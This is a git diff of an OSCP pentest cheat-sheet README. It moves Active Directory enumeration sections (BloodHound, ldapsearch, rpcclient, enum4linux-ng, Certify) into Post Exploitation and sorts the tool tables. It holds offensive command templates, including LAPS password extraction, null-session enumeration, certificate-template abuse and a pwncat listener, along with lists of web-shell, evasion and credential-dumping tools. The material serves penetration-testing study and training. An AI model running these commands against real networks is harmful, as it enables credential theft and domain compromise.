@@ -54,15 +54,10 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [virtualenv](https://github.com/0xsyr0/OSCP#virtualenv)
 	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
 		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
-		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
-		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
-		- [Certify](https://github.com/0xsyr0/OSCP#certify)
-		- [enum4linux-ng](https://github.com/0xsyr0/OSCP#enum4linux-ng)
-		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
 		- [memcached](https://github.com/0xsyr0/OSCP#memcached)
 		- [NetBIOS](https://github.com/0xsyr0/OSCP#netbios)
 		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
-		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
+		- [snmpwalk](https://github.com/0xsyr0/OSCP#snmpwalk)
 	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
 		- [Burp Suite](https://github.com/0xsyr0/OSCP#burp-suite)
 		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
@@ -108,18 +103,23 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
 		- [ADCSTemplate](https://github.com/0xsyr0/OSCP#adcstemplate)
+		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
+		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
 		- [Certify](https://github.com/0xsyr0/OSCP#certify-1)
 		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
+		- [enum4linux-ng](https://github.com/0xsyr0/OSCP#enum4linux-ng)
 		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
 		- [Impacket](https://github.com/0xsyr0/OSCP#impacket-1)
 		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
 		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos-1)
+		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
 		- [Linux](https://github.com/0xsyr0/OSCP#linux-1)
 		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows-1)
 		- [PKINITtools](https://github.com/0xsyr0/OSCP#pkinittools)
 		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
+		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
 		- [Rubeus](https://github.com/0xsyr0/OSCP#rubeus)
 		- [RunasCs](https://github.com/0xsyr0/OSCP#runascs)
 		- [winexe](https://github.com/0xsyr0/OSCP#winexe)
@@ -173,14 +173,6 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | Name | URL |
 | --- | --- |
 | Nmap | https://github.com/nmap/nmap |
-| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
-| BloodHound | https://github.com/BloodHoundAD/BloodHound |
-| BloodHound | https://github.com/ly4k/BloodHound |
-| BloodHound Docker | https://github.com/belane/docker-bloodhound |
-| BloodHound Python | https://github.com/fox-it/BloodHound.py |
-| pspy | https://github.com/DominicBreuker/pspy |
-| RustHound | https://github.com/OPENCYBER-FR/RustHound |
-| SharpHound | https://github.com/BloodHoundAD/SharpHound |
 
 ### Vulnerability Analysis
 
@@ -193,120 +185,129 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 
 | Name | URL |
 | --- | --- |
-| WPScan | https://github.com/wpscanteam/wpscan |
-| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
-| Gobuster | https://github.com/OJ/gobuster |
 | ffuf | https://github.com/ffuf/ffuf |
-| Wfuzz | https://github.com/xmendez/wfuzz |
+| fpmvuln | https://github.com/hannob/fpmvuln |
+| Gobuster | https://github.com/OJ/gobuster |
 | httpx | https://github.com/projectdiscovery/httpx |
 | JSON Web Tokens | https://jwt.io |
 | JWT_Tool | https://github.com/ticarpi/jwt_tool |
-| fpmvuln | https://github.com/hannob/fpmvuln |
-| PHPGGC | https://github.com/ambionics/phpggc |
-| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
-| ysoserial | https://github.com/frohoff/ysoserial |
 | Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
-| Weird Proxies | https://github.com/GrrrDog/weird_proxies |
-| SSRF testing resources | https://github.com/cujanovic/SSRF-Testing |
 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
+| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
+| PHPGGC | https://github.com/ambionics/phpggc |
+| SSRF testing resources | https://github.com/cujanovic/SSRF-Testing |
+| Weird Proxies | https://github.com/GrrrDog/weird_proxies |
+| Wfuzz | https://github.com/xmendez/wfuzz |
+| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
+| WPScan | https://github.com/wpscanteam/wpscan |
+| ysoserial | https://github.com/frohoff/ysoserial |
 
 ### Password Attacks
 
 | Name | URL |
 | --- | --- |
-| Hydra | https://github.com/vanhauser-thc/thc-hydra |
-| Patator | https://github.com/lanjelot/patator |
-| Kerbrute | https://github.com/ropnop/kerbrute |
 | CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
-| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
-| John | https://github.com/openwall/john |
+| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
 | hashcat | https://hashcat.net/hashcat |
+| Hydra | https://github.com/vanhauser-thc/thc-hydra |
+| John | https://github.com/openwall/john |
+| Kerbrute | https://github.com/ropnop/kerbrute |
 | LaZagne | https://github.com/AlessandroZ/LaZagne |
 | mimikatz | https://github.com/gentilkiwi/mimikatz |
+| Patator | https://github.com/lanjelot/patator |
 | pypykatz | https://github.com/skelsec/pypykatz |
 | RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
-| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
+| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
 
 ### Reverse Engineering
 
 | Name | URL |
 | --- | --- |
+| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
 | binwalk | https://github.com/ReFirmLabs/binwalk |
+| cutter | https://github.com/rizinorg/cutter |
+| dnSpy | https://github.com/dnSpy/dnSpy |
+| GEF | https://github.com/hugsy/gef |
+| ghidra | https://github.com/NationalSecurityAgency/ghidra |
 | ImHex | https://github.com/WerWolv/ImHex |
 | JD-GUI | https://github.com/java-decompiler/jd-gui |
-| dnSpy | https://github.com/dnSpy/dnSpy |
-| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
-| ghidra | https://github.com/NationalSecurityAgency/ghidra |
-| pwndbg | https://github.com/pwndbg/pwndbg |
-| cutter | https://github.com/rizinorg/cutter |
-| Radare2 | https://github.com/radareorg/radare2 |
-| GEF | https://github.com/hugsy/gef |
 | peda | https://github.com/longld/peda |
+| pwndbg | https://github.com/pwndbg/pwndbg |
+| Radare2 | https://github.com/radareorg/radare2 |
 
 ### Exploitation Tools
 
 | Name | URL |
 | --- | --- |
-| ImageTragick | https://imagetragick.com |
-| MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
+| ImageTragick | https://imagetragick.com |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
+| MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |
 
 ### Post Exploitation
 
 | Name | URL |
 | --- | --- |
-| pwncat | https://github.com/calebstewart/pwncat |
-| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
-| LinEnum | https://github.com/rebootuser/LinEnum |
-| JAWS | https://github.com/411Hall/JAWS |
-| Watson | https://github.com/rasta-mouse/Watson |
-| WESNG | https://github.com/bitsadmin/wesng
-| Sherlock | https://github.com/rasta-mouse/Sherlock |
-| scavenger | https://github.com/SpiderLabs/scavenger |
-| WADComs | https://wadcoms.github.io |
-| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
-| GTFOBins | https://gtfobins.github.io |
-| LOLBAS | https://lolbas-project.github.io |
-| lsassy | https://github.com/Hackndo/lsassy |
-| PPLdump | https://github.com/itm4n/PPLdump |
-| nanodump | https://github.com/helpsystems/nanodump |
-| LAPSDumper | https://github.com/n00py/LAPSDumper |
+| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
+| BloodHound Docker | https://github.com/belane/docker-bloodhound |
+| BloodHound | https://github.com/BloodHoundAD/BloodHound |
+| BloodHound | https://github.com/ly4k/BloodHound |
+| BloodHound Python | https://github.com/fox-it/BloodHound.py |
 | Certify | https://github.com/GhostPack/Certify |
 | Certipy | https://github.com/ly4k/Certipy |
-| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
-| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
-| PKINITtools | https://github.com/dirkjanm/PKINITtools |
-| Whisker | https://github.com/eladshamir/Whisker |
-| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
-| Rubeus | https://github.com/GhostPack/Rubeus |
+| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
+| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
+| GTFOBins | https://gtfobins.github.io |
+| Impacket | https://github.com/fortra/impacket |
+| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
+| JAWS | https://github.com/411Hall/JAWS |
 | KrbRelay | https://github.com/cube0x0/KrbRelay |
 | KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
 | Krbrelayx | https://github.com/dirkjanm/krbrelayx |
-| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
-| Impacket | https://github.com/fortra/impacket |
-| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
-| RunasCs | https://github.com/antonioCoco/RunasCs |
-| Villain | https://github.com/t3l3machus/Villain |
+| LAPSDumper | https://github.com/n00py/LAPSDumper |
+| LinEnum | https://github.com/rebootuser/LinEnum |
+| LOLBAS | https://lolbas-project.github.io |
+| lsassy | https://github.com/Hackndo/lsassy |
+| nanodump | https://github.com/helpsystems/nanodump |
+| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
+| PKINITtools | https://github.com/dirkjanm/PKINITtools |
 | powercat | https://github.com/besimorhino/powercat |
+| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
 | PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
 | PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
-| SharpView | https://github.com/tevora-threat/SharpView |
-| SharpCollection | https://github.com/Flangvik/SharpCollection |
-| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
-| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
-| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
-| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
+| PowerView.py | https://github.com/aniqfakhrul/powerview.py |
+| PPLdump | https://github.com/itm4n/PPLdump |
 | Priv2Admin | https://github.com/gtworek/Priv2Admin |
+| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
+| pspy | https://github.com/DominicBreuker/pspy |
+| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
+| pwncat | https://github.com/calebstewart/pwncat |
+| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
+| Rubeus | https://github.com/GhostPack/Rubeus |
+| RunasCs | https://github.com/antonioCoco/RunasCs |
+| RustHound | https://github.com/OPENCYBER-FR/RustHound |
+| scavenger | https://github.com/SpiderLabs/scavenger |
+| SharpCollection | https://github.com/Flangvik/SharpCollection |
+| SharpHound | https://github.com/BloodHoundAD/SharpHound |
+| SharpView | https://github.com/tevora-threat/SharpView |
+| Sherlock | https://github.com/rasta-mouse/Sherlock |
+| Villain | https://github.com/t3l3machus/Villain |
+| WADComs | https://wadcoms.github.io |
+| Watson | https://github.com/rasta-mouse/Watson |
+| WESNG | https://github.com/bitsadmin/wesng
+| Whisker | https://github.com/eladshamir/Whisker |
+| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
+| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
+| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 
 ### Exploit Databases
 
 | Database | URL |
 | --- | --- |
-| Exploit Database | https://www.exploit-db.com |
-| Sploitus | https://sploitus.com |
-| Packet Storm | https://packetstormsecurity.com |
 | 0day.today Exploit Database | https://0day.today |
+| Exploit Database | https://www.exploit-db.com |
+| Packet Storm | https://packetstormsecurity.com |
+| Sploitus | https://sploitus.com |
 
 ### CVEs
 
@@ -401,37 +402,36 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 
 | Name | URL |
 | --- | --- |
-| phpgcc | https://github.com/ambionics/phpggc |
-| unicorn | https://github.com/trustedsec/unicorn |
-| nishang | https://github.com/samratashok/nishang |
-| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
-| Veil | https://github.com/Veil-Framework/Veil |
+| AMSI.fail | http://amsi.fail |
 | Donut | https://github.com/TheWover/donut |
 | Freeze | https://github.com/optiv/Freeze |
-| ScareCrow | https://github.com/optiv/ScareCrow |
-| PowerLine | https://github.com/fullmetalcache/powerline |
-| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
-| marshalsec | https://github.com/mbechler/marshalsec |
-| ysoserial | https://github.com/frohoff/ysoserial |
-| ysoserial.net | https://github.com/pwntester/ysoserial.net |
-| AMSI.fail | http://amsi.fail |
 | hoaxshell | https://github.com/t3l3machus/hoaxshell |
 | Invoke-Obfuscation | https://github.com/danielbohannon/Invoke-Obfuscation |
-| Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
-| webshell | https://github.com/tennc/webshell |
-| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
-| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
+| marshalsec | https://github.com/mbechler/marshalsec |
+| nishang | https://github.com/samratashok/nishang |
 | Payload Box | https://github.com/payloadbox |
 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
-
+| phpgcc | https://github.com/ambionics/phpggc |
+| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
+| PowerLine | https://github.com/fullmetalcache/powerline |
+| Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
+| ScareCrow | https://github.com/optiv/ScareCrow |
+| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
+| unicorn | https://github.com/trustedsec/unicorn |
+| Veil | https://github.com/Veil-Framework/Veil |
+| webshell | https://github.com/tennc/webshell |
+| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
+| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
+| ysoserial | https://github.com/frohoff/ysoserial |
+| ysoserial.net | https://github.com/pwntester/ysoserial.net |
 ### Wordlists
 
 | Name | URL |
 | --- | --- |
-| CeWL | https://github.com/digininja/cewl |
-| CUPP | https://github.com/Mebus/cupp |
-| COOK | https://github.com/giteshnxtlvl/cook |
 | bopscrk | https://github.com/R3nt0n/bopscrk |
+| CeWL | https://github.com/digininja/cewl |
+| COOK | https://github.com/giteshnxtlvl/cook |
+| CUPP | https://github.com/Mebus/cupp |
 | Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
 | SecLists | https://github.com/danielmiessler/SecLists |
 
@@ -863,64 +863,6 @@ ls -lh /usr/share/nmap/scripts/*ssh*
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
 
-#### BloodHound
-
-```c
-pip install bloodhound
-sudo apt-get install neo4j
-sudo apt-get install bloodhound
-```
-
-##### Installing and starting Database
-
-```c
-wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
-sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
-sudo apt-get update
-sudo apt-get install apt-transport-https
-sudo apt-get install neo4j
-systemctl start neo4j
-```
-
-```c
-sudo neo4j start console
-sudo bloodhound --no-sandbox
-```
-
->  http://localhost:7474/browser/
-
-#### BloodHound Python
-
-```c
-bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
-bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <RHOST> -c All
-bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
-```
-
-#### Certify
-
-```c
-.\Certify.exe find /vulnerable /currentuser
-```
-
-#### enum4linux-ng
-
-```c
-enum4linux-ng -A <RHOST>
-```
-
-#### ldapsearch
-
-```c
-ldapsearch -x -w <PASSWORD>
-ldapsearch -x -h <RHOST> -s base namingcontexts
-ldapsearch -x -b "dc=<RHOST>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
-ldapsearch -x -D "cn=admin,dc=<RHOST>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
-ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
-ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<RHOST>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
-ldapsearch -H ldap://<DOMAIN> -b "DC=<DOMAIN>,DC=local" > <FILE>.txt
-```
-
 #### memcached
 
 >  https://github.com/pd4d10/memcached-cli
@@ -964,35 +906,6 @@ for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
 
 ```c
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
-```
-
-#### rpcclient
-
-```c
-$ rpcclient -U "" <RHOST>
-```
-
-```c
-srvinfo
-netshareenum
-netshareenumall
-netsharegetinfo
-netfileenum
-netsessenum
-netdiskenum
-netconnenum
-getanydcname
-getdcname
-dsr_getdcname
-dsr_getdcnameex
-dsr_getdcnameex2
-dsr_getsitename
-enumdomusers
-enumdata
-enumjobs
-enumports
-enumprivs
-queryuser <USERNAME>
 ```
 
 #### snmpwalk
@@ -2548,12 +2461,47 @@ Import-Module .\ADCSTemplate.psm1
 New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
 ```
 
+#### BloodHound
+
+```c
+pip install bloodhound
+sudo apt-get install neo4j
+sudo apt-get install bloodhound
+```
+
+##### Installing and starting Database
+
+```c
+wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
+sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
+sudo apt-get update
+sudo apt-get install apt-transport-https
+sudo apt-get install neo4j
+systemctl start neo4j
+```
+
+```c
+sudo neo4j start console
+sudo bloodhound --no-sandbox
+```
+
+>  http://localhost:7474/browser/
+
+#### BloodHound Python
+
+```c
+bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
+bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <RHOST> -c All
+bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <RHOST> -ns <RHOST> --dns-tcp -no-pass -c ALL --zip
+```
+
 #### Certify
 
 > https://github.com/GhostPack/Certify
 
 ```c
-PS: C:\> Certify find /vulnerable
+.\Certify find /vulnerable
+.\Certify.exe find /vulnerable /currentuser
 ```
 
 #### Certipy
@@ -2618,6 +2566,12 @@ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <T
 
 ```c
 ./BloodHound --disable-gpu-sandbox
+```
+
+#### enum4linux-ng
+
+```c
+enum4linux-ng -A <RHOST>
 ```
 
 #### Evil-WinRM
@@ -3081,6 +3035,18 @@ mimikatz # kerberos::ptt <KIRBI_FILE>
 
 ```c
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
+```
+
+#### ldapsearch
+
+```c
+ldapsearch -x -w <PASSWORD>
+ldapsearch -x -h <RHOST> -s base namingcontexts
+ldapsearch -x -b "dc=<RHOST>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
+ldapsearch -x -D "cn=admin,dc=<RHOST>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
+ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
+ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<RHOST>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+ldapsearch -H ldap://<DOMAIN> -b "DC=<DOMAIN>,DC=local" > <FILE>.txt
 ```
 
 #### Linux
@@ -3836,6 +3802,35 @@ Ctrl+d                  // get back to pwncat shell
 pwncat-cs -lp <LPORT>
 (local) pwncat$ download /PATH/TO/FILE/<FILE> .
 (local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
+```
+
+#### rpcclient
+
+```c
+$ rpcclient -U "" <RHOST>
+```
+
+```c
+srvinfo
+netshareenum
+netshareenumall
+netsharegetinfo
+netfileenum
+netsessenum
+netdiskenum
+netconnenum
+getanydcname
+getdcname
+dsr_getdcname
+dsr_getdcnameex
+dsr_getdcnameex2
+dsr_getsitename
+enumdomusers
+enumdata
+enumjobs
+enumports
+enumprivs
+queryuser <USERNAME>
 ```
 
 #### Rubeus
